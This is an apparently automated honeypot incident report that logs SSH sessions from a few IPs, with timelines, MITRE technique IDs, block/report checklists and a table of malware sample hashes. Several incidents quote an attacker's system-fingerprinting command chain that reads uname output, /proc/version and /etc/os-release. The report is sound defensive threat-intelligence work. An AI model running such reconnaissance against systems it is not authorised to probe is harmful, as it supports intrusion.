| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:41:47` | `cowrie.session.connect` |
| `2026-09-12 14:41:47` | `cowrie.client.version` |
| `2026-09-12 14:41:47` | `cowrie.client.kex` |
| `2026-09-12 14:41:48` | `cowrie.login.success` |
| `2026-09-12 14:41:49` | `cowrie.session.params` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.success` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.command.input` |
| `2026-09-12 14:41:49` | `cowrie.log.closed` |
| `2026-09-12 14:41:50` | `cowrie.session.params` |
| `2026-09-12 14:41:50` | `cowrie.command.input` |
| `2026-09-12 14:41:50` | `cowrie.log.closed` |
| `2026-09-12 14:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d7f9812344f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:42 |
| **Last Seen** | 2026-09-12 14:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:42:04` | `cowrie.session.connect` |
| `2026-09-12 14:42:04` | `cowrie.client.version` |
| `2026-09-12 14:42:05` | `cowrie.client.kex` |
| `2026-09-12 14:42:05` | `cowrie.login.success` |
| `2026-09-12 14:42:05` | `cowrie.session.params` |
| `2026-09-12 14:42:05` | `cowrie.command.input` |
| `2026-09-12 14:42:06` | `cowrie.log.closed` |
| `2026-09-12 14:42:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab23af38954

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:43 |
| **Last Seen** | 2026-09-12 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:43:51` | `cowrie.session.connect` |
| `2026-09-12 14:43:51` | `cowrie.client.version` |
| `2026-09-12 14:43:51` | `cowrie.client.kex` |
| `2026-09-12 14:43:51` | `cowrie.login.success` |
| `2026-09-12 14:43:52` | `cowrie.session.params` |
| `2026-09-12 14:43:52` | `cowrie.command.input` |
| `2026-09-12 14:43:52` | `cowrie.log.closed` |
| `2026-09-12 14:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e5f0b3174c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:45 |
| **Last Seen** | 2026-09-12 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:45:32` | `cowrie.session.connect` |
| `2026-09-12 14:45:32` | `cowrie.client.version` |
| `2026-09-12 14:45:32` | `cowrie.client.kex` |
| `2026-09-12 14:45:33` | `cowrie.login.success` |
| `2026-09-12 14:45:33` | `cowrie.session.params` |
| `2026-09-12 14:45:33` | `cowrie.command.input` |
| `2026-09-12 14:45:33` | `cowrie.log.closed` |
| `2026-09-12 14:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0f9afb63eb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:46 |
| **Last Seen** | 2026-09-12 14:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:46:24` | `cowrie.session.connect` |
| `2026-09-12 14:46:24` | `cowrie.client.version` |
| `2026-09-12 14:46:24` | `cowrie.client.kex` |
| `2026-09-12 14:46:25` | `cowrie.login.success` |
| `2026-09-12 14:46:26` | `cowrie.session.params` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.success` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:26` | `cowrie.command.input` |
| `2026-09-12 14:46:28` | `cowrie.log.closed` |
| `2026-09-12 14:46:29` | `cowrie.session.params` |
| `2026-09-12 14:46:29` | `cowrie.command.input` |
| `2026-09-12 14:46:30` | `cowrie.log.closed` |
| `2026-09-12 14:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3cda1b1cad

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:47 |
| **Last Seen** | 2026-09-12 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:47:10` | `cowrie.session.connect` |
| `2026-09-12 14:47:10` | `cowrie.client.version` |
| `2026-09-12 14:47:11` | `cowrie.client.kex` |
| `2026-09-12 14:47:11` | `cowrie.login.success` |
| `2026-09-12 14:47:11` | `cowrie.session.params` |
| `2026-09-12 14:47:11` | `cowrie.command.input` |
| `2026-09-12 14:47:12` | `cowrie.log.closed` |
| `2026-09-12 14:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c85d5caf9e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:48 |
| **Last Seen** | 2026-09-12 14:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:48:40` | `cowrie.session.connect` |
| `2026-09-12 14:48:40` | `cowrie.client.version` |
| `2026-09-12 14:48:40` | `cowrie.client.kex` |
| `2026-09-12 14:48:42` | `cowrie.login.success` |
| `2026-09-12 14:48:43` | `cowrie.session.params` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.success` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:43` | `cowrie.command.input` |
| `2026-09-12 14:48:44` | `cowrie.log.closed` |
| `2026-09-12 14:48:45` | `cowrie.session.params` |
| `2026-09-12 14:48:45` | `cowrie.command.input` |
| `2026-09-12 14:48:45` | `cowrie.log.closed` |
| `2026-09-12 14:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c85abd302b1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:48 |
| **Last Seen** | 2026-09-12 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:48:52` | `cowrie.session.connect` |
| `2026-09-12 14:48:52` | `cowrie.client.version` |
| `2026-09-12 14:48:52` | `cowrie.client.kex` |
| `2026-09-12 14:48:52` | `cowrie.login.success` |
| `2026-09-12 14:48:53` | `cowrie.session.params` |
| `2026-09-12 14:48:53` | `cowrie.command.input` |
| `2026-09-12 14:48:53` | `cowrie.log.closed` |
| `2026-09-12 14:48:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a80b60c4c36

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:50 |
| **Last Seen** | 2026-09-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:50:34` | `cowrie.session.connect` |
| `2026-09-12 14:50:34` | `cowrie.client.version` |
| `2026-09-12 14:50:34` | `cowrie.client.kex` |
| `2026-09-12 14:50:34` | `cowrie.login.success` |
| `2026-09-12 14:50:35` | `cowrie.session.params` |
| `2026-09-12 14:50:35` | `cowrie.command.input` |
| `2026-09-12 14:50:35` | `cowrie.log.closed` |
| `2026-09-12 14:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c9bd9939c87

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:50 |
| **Last Seen** | 2026-09-12 14:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:50:50` | `cowrie.session.connect` |
| `2026-09-12 14:50:51` | `cowrie.client.version` |
| `2026-09-12 14:50:51` | `cowrie.client.kex` |
| `2026-09-12 14:50:52` | `cowrie.login.success` |
| `2026-09-12 14:50:53` | `cowrie.session.params` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.success` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.command.input` |
| `2026-09-12 14:50:53` | `cowrie.log.closed` |
| `2026-09-12 14:50:54` | `cowrie.session.params` |
| `2026-09-12 14:50:54` | `cowrie.command.input` |
| `2026-09-12 14:50:55` | `cowrie.log.closed` |
| `2026-09-12 14:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69a3f61d330f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:52 |
| **Last Seen** | 2026-09-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:52:12` | `cowrie.session.connect` |
| `2026-09-12 14:52:12` | `cowrie.client.version` |
| `2026-09-12 14:52:12` | `cowrie.client.kex` |
| `2026-09-12 14:52:13` | `cowrie.login.success` |
| `2026-09-12 14:52:13` | `cowrie.session.params` |
| `2026-09-12 14:52:13` | `cowrie.command.input` |
| `2026-09-12 14:52:13` | `cowrie.log.closed` |
| `2026-09-12 14:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a98cb1b33008

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:52 |
| **Last Seen** | 2026-09-12 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:52:57` | `cowrie.session.connect` |
| `2026-09-12 14:52:57` | `cowrie.client.version` |
| `2026-09-12 14:52:57` | `cowrie.client.kex` |
| `2026-09-12 14:52:58` | `cowrie.login.success` |
| `2026-09-12 14:52:59` | `cowrie.session.params` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.success` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:52:59` | `cowrie.command.input` |
| `2026-09-12 14:53:00` | `cowrie.log.closed` |
| `2026-09-12 14:53:01` | `cowrie.session.params` |
| `2026-09-12 14:53:01` | `cowrie.command.input` |
| `2026-09-12 14:53:01` | `cowrie.log.closed` |
| `2026-09-12 14:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66e0b7b479e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:53 |
| **Last Seen** | 2026-09-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:53:51` | `cowrie.session.connect` |
| `2026-09-12 14:53:51` | `cowrie.client.version` |
| `2026-09-12 14:53:51` | `cowrie.client.kex` |
| `2026-09-12 14:53:51` | `cowrie.login.success` |
| `2026-09-12 14:53:52` | `cowrie.session.params` |
| `2026-09-12 14:53:52` | `cowrie.command.input` |
| `2026-09-12 14:53:52` | `cowrie.log.closed` |
| `2026-09-12 14:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.150.146[.]69` | **11** | 2026-09-12 12:56 | 2026-09-12 14:51 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `75.155.35[.]127` | **3** | 2026-09-12 13:33 | 2026-09-12 13:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.186.140[.]73` | **2** | 2026-09-12 13:48 | 2026-09-12 13:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-09-12 14:28 | 2026-09-12 14:44 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `98.183.25[.]37` | **2** | 2026-09-12 13:00 | 2026-09-12 13:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `148.204.110[.]13` | 1 | 2026-09-12 14:11 | 2026-09-12 14:11 | 11s | 0 | `T1592` | 🟢 LOW |
| `45.14.109[.]143` | 1 | 2026-09-12 13:12 | 2026-09-12 13:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]17` | 1 | 2026-09-12 14:47 | 2026-09-12 14:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]59` | 1 | 2026-09-12 14:31 | 2026-09-12 14:31 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
